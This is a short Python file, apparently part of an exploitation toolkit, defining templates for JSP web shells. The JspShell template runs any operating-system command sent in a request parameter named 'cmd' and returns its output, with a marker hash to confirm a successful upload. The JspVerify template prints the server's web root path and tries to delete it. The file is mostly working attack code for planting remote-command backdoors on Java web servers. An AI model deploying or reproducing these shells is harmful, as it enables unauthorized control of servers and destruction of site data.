#author: fyth.cnss@gmail.com

from webshell import *


class JspShell(Webshell):
    _content = '<%@ page import="java.util.*,java.io.*"%>\n' \
               '<%\n' \
               'if (request.getParameter("check") == "1")\n' \
               '    out.println("00799a96dcc29282dd74e23e49b647aa");\n' \
               'if (request.getParameter("{pwd}") != null)\n' \
               '{{\n' \
               '    Process p = Runtime.getRuntime().exec(request.getParameter("{pwd}"));\n' \
               '    OutputStream os = p.getOutputStream();\n' \
               '    InputStream in = p.getInputStream();\n' \
               '    DataInputStream dis = new DataInputStream(in);\n' \
               '    String disr = dis.readLine();\n' \
               '    while ( disr != null)\n' \
               '    {{\n' \
               '        out.println(disr);\n' \
               '        disr = dis.readLine();\n' \
               '    }}\n' \
               '\n}}' \
               '%>\n'
    _password = 'cmd'
    _check_data = {'check': '1'}
    _keyword = '00799a96dcc29282dd74e23e49b647aa'

class JspVerify(VerifyShell):
    _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
               '<%@ page import="java.io.*"%>\n' \
               '<%\n' \
               'String path=request.getRealPath("");\n' \
               'out.println(path);\n' \
               'File d=new File(path);\n' \
               'if(d.exists()){{\n' \
               '  d.delete();\n' \
               '  }}\n' \
               '%>\n' \
               '<% out.println("00799a96dcc29282dd74e23e49b647aa");%>'
    _keyword = '00799a96dcc29282dd74e23e49b647aa'